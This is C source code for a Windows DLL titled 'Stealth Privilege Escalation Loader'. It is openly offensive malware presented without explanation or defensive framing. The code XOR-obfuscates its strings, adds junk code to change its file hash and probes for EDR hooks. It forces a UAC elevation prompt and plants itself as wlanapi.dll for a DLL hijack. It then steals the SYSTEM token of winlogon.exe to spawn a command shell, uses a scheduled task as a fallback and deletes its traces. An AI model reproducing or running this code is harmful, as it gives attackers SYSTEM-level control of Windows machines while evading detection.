// ========================================================================
// Stealth Privilege Escalation Loader v1.0
// ========================================================================

#define _CRT_SECURE_NO_WARNINGS 1
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <tlhelp32.h>
#include <wlanapi.h>
#include <shellapi.h>
#include <winsvc.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")

// --------------------------------------------------------------
// 0. OBFUSCATION MACROS (Key 0x7C)
// --------------------------------------------------------------
#define XKEY 0x7C

// Digits
#define H_0 '0'
#define H_1 '1'
#define H_2 '2'
#define H_3 '3'
#define H_4 '4'
#define H_5 '5'
#define H_6 '6'
#define H_7 '7'
#define H_8 '8'
#define H_9 '9'

// Lowercase
#define H_a 'a'
#define H_b 'b'
#define H_c 'c'
#define H_d 'd'
#define H_e 'e'
#define H_f 'f'
#define H_g 'g'
#define H_h 'h'
#define H_i 'i'
#define H_j 'j'
#define H_k 'k'
#define H_l 'l'
#define H_m 'm'
#define H_n 'n'
#define H_o 'o'
#define H_p 'p'
#define H_q 'q'
#define H_r 'r'
#define H_s 's'
#define H_t 't'
#define H_u 'u'
#define H_v 'v'
#define H_w 'w'
#define H_x 'x'
#define H_y 'y'
#define H_z 'z'

// Uppercase
#define H_A 'A'
#define H_B 'B'
#define H_C 'C'
#define H_D 'D'
#define H_E 'E'
#define H_F 'F'
#define H_G 'G'
#define H_H 'H'
#define H_I 'I'
#define H_J 'J'
#define H_K 'K'
#define H_L 'L'
#define H_M 'M'
#define H_N 'N'
#define H_O 'O'
#define H_P 'P'
#define H_Q 'Q'
#define H_R 'R'
#define H_S 'S'
#define H_T 'T'
#define H_U 'U'
#define H_V 'V'
#define H_W 'W'
#define H_X 'X'
#define H_Y 'Y'
#define H_Z 'Z'

// Specials
#define H_space ' '
#define H_dot '.'
#define H_slash '/'
#define H_backslash '\\'
#define H_colon ':'
#define H_hyphen '-'
#define H_underscore '_'
#define H_at '@'
#define H_hash '#'
#define H_dollar '$'
#define H_percent '%'
#define H_amp '&'
#define H_asterisk '*'
#define H_plus '+'
#define H_comma ','
#define H_semicolon ';'
#define H_less '<'
#define H_equal '='
#define H_greater '>'
#define H_question '?'
#define H_lbracket '['
#define H_rbracket ']'
#define H_caret '^'
#define H_backtick '`'
#define H_lbrace '{'
#define H_pipe '|'
#define H_rbrace '}'
#define H_tilde '~'
#define H_exclam '!'
#define H_quote '"'
#define H_apostrophe '\''
#define H_lparen '('
#define H_rparen ')'

// Obfuscated strings
unsigned char enc_winlogon[] = { H_w ^ XKEY, H_i ^ XKEY, H_n ^ XKEY, H_l ^ XKEY, H_o ^ XKEY, H_g ^ XKEY, H_o ^ XKEY, H_n ^ XKEY, H_dot ^ XKEY, H_e ^ XKEY, H_x ^ XKEY, H_e ^ XKEY, 0 };
unsigned char enc_cmd[] = { H_c ^ XKEY, H_m ^ XKEY, H_d ^ XKEY, H_dot ^ XKEY, H_e ^ XKEY, H_x ^ XKEY, H_e ^ XKEY, 0 };
unsigned char enc_se_debug[] = { H_S ^ XKEY, H_e ^ XKEY, H_D ^ XKEY, H_e ^ XKEY, H_b ^ XKEY, H_u ^ XKEY, H_g ^ XKEY, H_P ^ XKEY, H_r ^ XKEY, H_i ^ XKEY, H_v ^ XKEY, H_i ^ XKEY, H_l ^ XKEY, H_e ^ XKEY, H_g ^ XKEY, H_e ^ XKEY, 0 };
unsigned char enc_advapi[] = { H_a ^ XKEY, H_d ^ XKEY, H_v ^ XKEY, H_a ^ XKEY, H_p ^ XKEY, H_i ^ XKEY, H_3 ^ XKEY, H_2 ^ XKEY, H_dot ^ XKEY, H_d ^ XKEY, H_l ^ XKEY, H_l ^ XKEY, 0 };
unsigned char enc_wlanapi[] = { H_w ^ XKEY, H_l ^ XKEY, H_a ^ XKEY, H_n ^ XKEY, H_a ^ XKEY, H_p ^ XKEY, H_i ^ XKEY, H_dot ^ XKEY, H_d ^ XKEY, H_l ^ XKEY, H_l ^ XKEY, 0 };

#define DECODE_STR(var) for (int i=0; var[i]; i++) var[i] ^= XKEY;

// --------------------------------------------------------------
// GLOBALS
// --------------------------------------------------------------
HMODULE g_hModule = NULL;
HANDLE  g_hLogFile = INVALID_HANDLE_VALUE;
char    g_logPath[MAX_PATH] = { 0 };
CRITICAL_SECTION g_csLog;
HANDLE  g_hWorkerThread = NULL;

// --------------------------------------------------------------
// 1. DEBUG LOGGER
// --------------------------------------------------------------
void debug_log(const char* fmt, ...) {
    SYSTEMTIME st;
    GetLocalTime(&st);
    char timeStr[64];
    snprintf(timeStr, sizeof(timeStr), "[%02d:%02d:%02d.%03d] ", st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);

    char buffer[2048];
    va_list args;
    va_start(args, fmt);
    vsnprintf(buffer, sizeof(buffer), fmt, args);
    va_end(args);

    printf("%s%s\n", timeStr, buffer);

    if (g_hLogFile != INVALID_HANDLE_VALUE) {
        EnterCriticalSection(&g_csLog);
        char line[4096];
        snprintf(line, sizeof(line), "%s%s\n", timeStr, buffer);
        DWORD written;
        WriteFile(g_hLogFile, line, (DWORD)strlen(line), &written, NULL);
        FlushFileBuffers(g_hLogFile);
        LeaveCriticalSection(&g_csLog);
    }
}

// --------------------------------------------------------------
// 2. INIT LOG FILE
// --------------------------------------------------------------
void init_log() {
    InitializeCriticalSection(&g_csLog);

    char dllPath[MAX_PATH];
    GetModuleFileNameA(g_hModule, dllPath, MAX_PATH);
    char* lastSlash = strrchr(dllPath, '\\');
    if (lastSlash) {
        *(lastSlash + 1) = '\0';
        snprintf(g_logPath, sizeof(g_logPath), "%sLoaderDLL_%d.log", dllPath, GetCurrentProcessId());
    } else {
        GetCurrentDirectoryA(MAX_PATH, g_logPath);
        strcat_s(g_logPath, "\\LoaderDLL.log");
    }

    g_hLogFile = CreateFileA(g_logPath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (g_hLogFile != INVALID_HANDLE_VALUE) {
        debug_log("=== Debug log started (PID: %d) ===", GetCurrentProcessId());
        debug_log("Log file: %s", g_logPath);
    } else {
        char tempPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);
        snprintf(g_logPath, sizeof(g_logPath), "%sLoaderDLL_%d.log", tempPath, GetCurrentProcessId());
        g_hLogFile = CreateFileA(g_logPath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (g_hLogFile != INVALID_HANDLE_VALUE) {
            debug_log("=== Debug log started (fallback temp) ===");
            debug_log("Log file: %s", g_logPath);
        }
    }
}

void close_log() {
    if (g_hLogFile != INVALID_HANDLE_VALUE) {
        debug_log("=== Debug log ended ===");
        FlushFileBuffers(g_hLogFile);
        CloseHandle(g_hLogFile);
        g_hLogFile = INVALID_HANDLE_VALUE;
    }
    DeleteCriticalSection(&g_csLog);
}

// --------------------------------------------------------------
// 3. DYNAMIC API RESOLVERS
// --------------------------------------------------------------
typedef BOOL (WINAPI *pOpenProcessToken)(HANDLE, DWORD, PHANDLE);
typedef BOOL (WINAPI *pDuplicateTokenEx)(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
typedef BOOL (WINAPI *pLookupPrivilegeValueA)(LPCSTR, LPCSTR, PLUID);
typedef BOOL (WINAPI *pAdjustTokenPrivileges)(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
typedef HANDLE (WINAPI *pOpenProcess)(DWORD, BOOL, DWORD);
typedef BOOL (WINAPI *pCreateProcessWithTokenW)(HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);

pOpenProcessToken           fOpenProcessToken = NULL;
pDuplicateTokenEx           fDuplicateTokenEx = NULL;
pLookupPrivilegeValueA      fLookupPrivilegeValueA = NULL;
pAdjustTokenPrivileges      fAdjustTokenPrivileges = NULL;
pOpenProcess                fOpenProcess = NULL;
pCreateProcessWithTokenW    fCreateProcessWithTokenW = NULL;

// --------------------------------------------------------------
// 4. HELPER: Enable SeDebugPrivilege
// --------------------------------------------------------------
BOOL enable_debug_privilege() {
    HANDLE hToken;
    if (!fOpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!fLookupPrivilegeValueA(NULL, (LPCSTR)enc_se_debug, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL result = fAdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return result;
}

// --------------------------------------------------------------
// 5. JUNK CODE (to alter PE hash)
// --------------------------------------------------------------
void junk_code() {
    volatile int a = 0x1234;
    volatile int b = 0x5678;
    volatile int c = a ^ b;
    c++;
    char dummy[16] = {0};
    for (int i = 0; i < 16; i++) dummy[i] = (char)(i ^ 0xFF);
}

// --------------------------------------------------------------
// 6. ADMIN CHECK
// --------------------------------------------------------------
BOOL is_admin() {
    BOOL bIsAdmin = FALSE;
    PSID pAdminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                 DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdminGroup)) {
        CheckTokenMembership(NULL, pAdminGroup, &bIsAdmin);
        FreeSid(pAdminGroup);
    }
    debug_log("is_admin() -> %d", bIsAdmin);
    return bIsAdmin;
}

// --------------------------------------------------------------
// 7. AUTO‑ELEVATION
// --------------------------------------------------------------
BOOL relaunch_elevated() {
    debug_log("Attempting to relaunch with elevation (UAC)...");
    wchar_t dllPath[MAX_PATH];
    if (!GetModuleFileNameW(g_hModule, dllPath, MAX_PATH)) {
        debug_log("ERROR: GetModuleFileNameW failed (error: %d)", GetLastError());
        return FALSE;
    }
    debug_log("DLL path: %S", dllPath);

    wchar_t params[2048];
    wcscpy_s(params, 2048, L"\"");
    wcscat_s(params, 2048, dllPath);
    wcscat_s(params, 2048, L"\",Run");

    debug_log("Executing: rundll32.exe %S", params);

    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"runas";
    sei.lpFile = L"rundll32.exe";
    sei.lpParameters = params;
    sei.nShow = SW_SHOW;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;

    if (!ShellExecuteExW(&sei)) {
        DWORD err = GetLastError();
        debug_log("ERROR: ShellExecuteEx failed (error: %d)", err);
        if (err == ERROR_CANCELLED) {
            MessageBoxA(NULL, "Elevation was cancelled by the user. Please run as Administrator.", "Elevation Required", MB_ICONERROR);
        }
        return FALSE;
    }

    debug_log("Elevated process started (handle: 0x%p). This instance will exit.", sei.hProcess);
    if (sei.hProcess) {
        Sleep(2000);
        CloseHandle(sei.hProcess);
    }
    return TRUE;
}

// --------------------------------------------------------------
// 8. LOG PROCESS INFO
// --------------------------------------------------------------
void log_process_info() {
    debug_log("=== Process Information ===");
    DWORD pid = GetCurrentProcessId();
    debug_log("PID: %d", pid);
    debug_log("Process Handle: 0x%p", GetCurrentProcess());
#ifdef _M_X64
    void* peb = (void*)__readgsqword(0x60);
    debug_log("PEB Address: 0x%p", peb);
#endif
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    if (snap != INVALID_HANDLE_VALUE) {
        MODULEENTRY32W me = { sizeof(me) };
        if (Module32FirstW(snap, &me)) {
            do {
                debug_log("Module: %S @ 0x%p (Size: %d)", me.szModule, me.modBaseAddr, me.modBaseSize);
            } while (Module32NextW(snap, &me));
        }
        CloseHandle(snap);
    }
    debug_log("=== End Process Information ===");
}

// --------------------------------------------------------------
// 9. STAGE 1: EDR UNHOOKING (SKIPPED)
// --------------------------------------------------------------
BOOL is_function_hooked(PVOID funcAddr) {
    BYTE* bytes = (BYTE*)funcAddr;
    if (bytes[0] == 0xE9 || bytes[0] == 0xE8) return TRUE;
    if (bytes[0] == 0xFF && bytes[1] == 0x25) return TRUE;
    return FALSE;
}

void unhook_ntdll() {
    debug_log("=== STAGE 1: EDR UNHOOKING ===");
    HMODULE hNtdll = GetModuleHandleA("ntdll");
    if (!hNtdll) {
        debug_log("ERROR: ntdll not loaded.");
        return;
    }
    debug_log("ntdll base: 0x%p", hNtdll);

    PVOID pNtProtect = (PVOID)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    PVOID pNtCreate = (PVOID)GetProcAddress(hNtdll, "NtCreateThreadEx");
    PVOID pNtAlloc = (PVOID)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");

    BOOL hooked = FALSE;
    if (is_function_hooked(pNtProtect) || is_function_hooked(pNtCreate) || is_function_hooked(pNtAlloc)) {
        hooked = TRUE;
        debug_log("EDR hooks detected – but skipping restoration to avoid potential crash.");
    } else {
        debug_log("No hooks detected – skipping restoration.");
    }
    debug_log("STAGE 1 COMPLETE (unhooking skipped).");
}

// --------------------------------------------------------------
// 10. STAGE 2: DLL HIJACK SETUP
// --------------------------------------------------------------
BOOL stage2_setup_dll_hijack() {
    debug_log("=== STAGE 2: DLL HIJACK SETUP ===");
    const char* targetPath = "C:\\ProgramData\\Microsoft\\WLAN\\wlanapi.dll";
    const char* targetDir = "C:\\ProgramData\\Microsoft\\WLAN\\";

    if (!CreateDirectoryA(targetDir, NULL)) {
        if (GetLastError() != ERROR_ALREADY_EXISTS) {
            debug_log("ERROR: CreateDirectory failed (error: %d)", GetLastError());
            return FALSE;
        }
    }
    debug_log("Target directory exists or created.");

    char selfPath[MAX_PATH];
    GetModuleFileNameA(g_hModule, selfPath, MAX_PATH);
    debug_log("Self path: %s", selfPath);

    if (!CopyFileA(selfPath, targetPath, FALSE)) {
        debug_log("ERROR: CopyFile failed (error: %d)", GetLastError());
        return FALSE;
    }
    debug_log("Copied self to %s", targetPath);
    debug_log("STAGE 2 SUCCESS.");
    return TRUE;
}

// --------------------------------------------------------------
// 11. STAGE 3: TRIGGER WlanSvc
// --------------------------------------------------------------
BOOL trigger_wlan_load() {
    debug_log("=== STAGE 3: TRIGGER WlanSvc ===");
    DWORD negotiatedVersion;
    HANDLE hClient;
    DWORD result = WlanOpenHandle(2, NULL, &negotiatedVersion, &hClient);
    if (result != ERROR_SUCCESS) {
        debug_log("ERROR: WlanOpenHandle failed (error: %d)", result);
        return FALSE;
    }
    debug_log("WlanOpenHandle success, client: 0x%p", hClient);

    PWLAN_INTERFACE_INFO_LIST pInterfaceList = NULL;
    result = WlanEnumInterfaces(hClient, NULL, &pInterfaceList);
    if (result != ERROR_SUCCESS) {
        debug_log("ERROR: WlanEnumInterfaces failed (error: %d)", result);
        WlanCloseHandle(hClient, NULL);
        return FALSE;
    }
    debug_log("WlanEnumInterfaces success, found %d interfaces.", pInterfaceList->dwNumberOfItems);
    WlanFreeMemory(pInterfaceList);
    WlanCloseHandle(hClient, NULL);
    debug_log("STAGE 3 SUCCESS.");
    return TRUE;
}

// --------------------------------------------------------------
// 12. FALLBACK: Spawn SYSTEM cmd via Scheduled Task (last resort)
// --------------------------------------------------------------
BOOL spawn_system_cmd_via_schtask() {
    debug_log("Fallback: creating scheduled task to run cmd.exe as current user (non‑SYSTEM)...");
    char taskName[64];
    snprintf(taskName, sizeof(taskName), "TempTask_%d", GetCurrentProcessId());
    
    SYSTEMTIME st;
    GetLocalTime(&st);
    st.wMinute += 2;
    if (st.wMinute >= 60) { st.wMinute -= 60; st.wHour++; }
    if (st.wHour >= 24) { st.wHour = 0; }
    char timeStr[16];
    snprintf(timeStr, sizeof(timeStr), "%02d:%02d", st.wHour, st.wMinute);
    
    char cmd[MAX_PATH * 2 + 512];
    snprintf(cmd, sizeof(cmd),
        "schtasks /create /tn \"%s\" /tr \"cmd.exe\" /sc once /st %s /ru %s /it /f",
        taskName, timeStr, getenv("USERNAME"));
    debug_log("Executing: %s", cmd);
    system(cmd);
    
    Sleep(1000);
    snprintf(cmd, sizeof(cmd), "schtasks /run /tn \"%s\"", taskName);
    debug_log("Executing: %s", cmd);
    system(cmd);
    
    Sleep(5000);
    snprintf(cmd, sizeof(cmd), "schtasks /delete /tn \"%s\" /f", taskName);
    debug_log("Executing: %s", cmd);
    system(cmd);
    
    debug_log("Fallback task completed (cmd.exe is NOT SYSTEM – just the current user).");
    return TRUE;
}

// --------------------------------------------------------------
// 13. STAGE 4: TOKEN STEALING & SPAWN (Using CreateProcessWithTokenW)
// --------------------------------------------------------------
BOOL spawn_cmd_with_system_token(DWORD targetPid) {
    debug_log("=== STAGE 4: TOKEN STEALING ===");
    debug_log("Target PID: %d", targetPid);

    // Decode strings
    DECODE_STR(enc_se_debug);
    DECODE_STR(enc_cmd);
    DECODE_STR(enc_advapi);

    // Resolve dynamic APIs
    HMODULE hAdvapi = LoadLibraryA((LPCSTR)enc_advapi);
    HMODULE hKernel = GetModuleHandleA("kernel32.dll");
    fOpenProcessToken = (pOpenProcessToken)GetProcAddress(hAdvapi, "OpenProcessToken");
    fDuplicateTokenEx = (pDuplicateTokenEx)GetProcAddress(hAdvapi, "DuplicateTokenEx");
    fLookupPrivilegeValueA = (pLookupPrivilegeValueA)GetProcAddress(hAdvapi, "LookupPrivilegeValueA");
    fAdjustTokenPrivileges = (pAdjustTokenPrivileges)GetProcAddress(hAdvapi, "AdjustTokenPrivileges");
    fOpenProcess = (pOpenProcess)GetProcAddress(hKernel, "OpenProcess");
    fCreateProcessWithTokenW = (pCreateProcessWithTokenW)GetProcAddress(hAdvapi, "CreateProcessWithTokenW");

    if (!fOpenProcessToken || !fDuplicateTokenEx || !fCreateProcessWithTokenW) {
        debug_log("ERROR: Failed to resolve required APIs");
        return FALSE;
    }

    if (!enable_debug_privilege()) {
        debug_log("WARNING: Failed to enable SeDebugPrivilege (error: %d)", GetLastError());
    } else {
        debug_log("SeDebugPrivilege enabled.");
    }

    HANDLE hProcess = fOpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, FALSE, targetPid);
    if (!hProcess) {
        debug_log("OpenProcess with QUERY access failed (error: %d), trying LIMITED...", GetLastError());
        hProcess = fOpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_DUP_HANDLE, FALSE, targetPid);
        if (!hProcess) {
            debug_log("ERROR: OpenProcess failed (error: %d)", GetLastError());
            return FALSE;
        }
    }
    debug_log("Opened process handle: 0x%p", hProcess);

    HANDLE hToken;
    if (!fOpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        debug_log("ERROR: OpenProcessToken failed (error: %d)", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }
    debug_log("Opened token handle: 0x%p", hToken);

    HANDLE hNewToken;
    if (!fDuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hNewToken)) {
        debug_log("ERROR: DuplicateTokenEx failed (error: %d)", GetLastError());
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return FALSE;
    }
    debug_log("Duplicated token handle: 0x%p", hNewToken);

    CloseHandle(hToken);
    CloseHandle(hProcess);

    // ---- Launch cmd.exe with SYSTEM token ----
    // Do NOT set lpDesktop or lpCurrentDirectory – let it inherit from parent.
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.wShowWindow = SW_SHOW;
    si.dwFlags = STARTF_USESHOWWINDOW;
    wchar_t cmdLine[] = L"cmd.exe";

    debug_log("Invoking CreateProcessWithTokenW (no desktop/directory override)");
    BOOL result = fCreateProcessWithTokenW(
        hNewToken,
        0,                           // no special flags
        NULL,
        cmdLine,
        CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT,
        NULL,                        // inherit environment
        NULL,                        // inherit current directory
        &si,
        &pi
    );

    if (!result) {
        DWORD err = GetLastError();
        debug_log("ERROR: CreateProcessWithTokenW failed (error: %d)", err);
        CloseHandle(hNewToken);
        debug_log("Attempting fallback (non‑SYSTEM) task...");
        return spawn_system_cmd_via_schtask();
    }

    debug_log("CreateProcessWithTokenW success, PID: %d", pi.dwProcessId);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hNewToken);
    debug_log("STAGE 4 SUCCESS.");
    return TRUE;
}

// --------------------------------------------------------------
// 14. STAGE 5: CLEANUP
// --------------------------------------------------------------
void stage5_cleanup() {
    debug_log("=== STAGE 5: CLEANUP ===");
    const char* targetPath = "C:\\ProgramData\\Microsoft\\WLAN\\wlanapi.dll";
    if (DeleteFileA(targetPath)) {
        debug_log("Deleted staged DLL: %s", targetPath);
    } else {
        debug_log("DeleteFile failed (error: %d)", GetLastError());
    }
    debug_log("STAGE 5 COMPLETE.");
}

// --------------------------------------------------------------
// 15. WORKER THREAD
// --------------------------------------------------------------
DWORD WINAPI worker_thread(LPVOID lpParam) {
    AllocConsole();
    FILE* fDummy;
    freopen_s(&fDummy, "CONOUT$", "w", stdout);
    freopen_s(&fDummy, "CONOUT$", "w", stderr);
    SetConsoleTitleA("Loader");

    junk_code();

    debug_log("=== LOADER START (worker thread) ===");
    debug_log("DLL Base Address: 0x%p", g_hModule);
    log_process_info();

    if (!is_admin()) {
        debug_log("Not running as admin. Attempting auto‑elevation...");
        if (!relaunch_elevated()) {
            debug_log("Elevation failed. Exiting.");
            close_log();
            FreeConsole();
            return 1;
        }
        debug_log("Elevated instance launched. Exiting current process.");
        close_log();
        FreeConsole();
        ExitProcess(0);
        return 0;
    }

    debug_log("Running with administrative privileges.");

    // Stage 1
    unhook_ntdll();

    // Stage 2
    if (!stage2_setup_dll_hijack()) {
        debug_log("STAGE 2 FAILED. Aborting.");
        close_log();
        FreeConsole();
        return 1;
    }

    // Stage 3
    trigger_wlan_load();

    // ---- Stage 4: steal token from winlogon.exe ----
    debug_log("=== STAGE 4: TOKEN STEALING (via winlogon.exe) ===");
    DECODE_STR(enc_winlogon);

    wchar_t winlogonW[64];
    MultiByteToWideChar(CP_ACP, 0, (LPCSTR)enc_winlogon, -1, winlogonW, 64);
    winlogonW[63] = L'\0';

    DWORD sysPid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, winlogonW) == 0) {
                sysPid = pe.th32ProcessID;
                debug_log("Found winlogon.exe PID: %d", sysPid);
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);

    if (sysPid == 0) {
        debug_log("ERROR: winlogon.exe not found.");
        close_log();
        FreeConsole();
        return 1;
    }

    if (!spawn_cmd_with_system_token(sysPid)) {
        debug_log("ERROR: Token stealing failed.");
        close_log();
        FreeConsole();
        return 1;
    }

    // Stage 5
    stage5_cleanup();

    debug_log("=== LOADER FINISHED SUCCESSFULLY ===");
    close_log();

    Sleep(10000);
    FreeConsole();
    return 0;
}

// --------------------------------------------------------------
// 16. DLL ENTRY POINT
// --------------------------------------------------------------
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        g_hModule = hModule;
        DisableThreadLibraryCalls(hModule);
        init_log();
        debug_log("=== DLL ATTACH ===");
        debug_log("DLL loaded at 0x%p", g_hModule);
        g_hWorkerThread = CreateThread(NULL, 0, worker_thread, NULL, 0, NULL);
        if (g_hWorkerThread) {
            debug_log("Worker thread created successfully (handle: 0x%p)", g_hWorkerThread);
        } else {
            debug_log("ERROR: CreateThread failed (error: %d)", GetLastError());
        }
    } else if (ul_reason_for_call == DLL_PROCESS_DETACH) {
        debug_log("=== DLL DETACH ===");
        close_log();
    }
    return TRUE;
}

// --------------------------------------------------------------
// 17. EXPORT
// --------------------------------------------------------------
extern "C" __declspec(dllexport) void CALLBACK Run(
    HWND hwnd,
    HINSTANCE hinst,
    LPSTR lpszCmdLine,
    int nCmdShow
) {
    debug_log("=== Export 'Run' called by rundll32 ===");
    if (g_hWorkerThread) {
        debug_log("Waiting for worker thread to complete...");
        WaitForSingleObject(g_hWorkerThread, INFINITE);
        CloseHandle(g_hWorkerThread);
        g_hWorkerThread = NULL;
        debug_log("Worker thread finished.");
    } else {
        debug_log("Worker thread handle is NULL.");
    }
}
